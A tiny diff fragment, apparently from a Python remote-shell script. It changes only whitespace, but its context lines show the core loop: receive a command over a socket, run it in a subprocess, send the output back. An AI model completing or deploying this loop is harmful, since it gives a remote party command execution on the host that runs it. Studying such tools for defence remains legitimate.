@@ -18,5 +18,5 @@ while command != "exit":
 	result, err = proc.communicate()
 	clientSocket.send(result)
 	command = (clientSocket.recv(4064)).decode()
-	
+
 clientSocket.close()
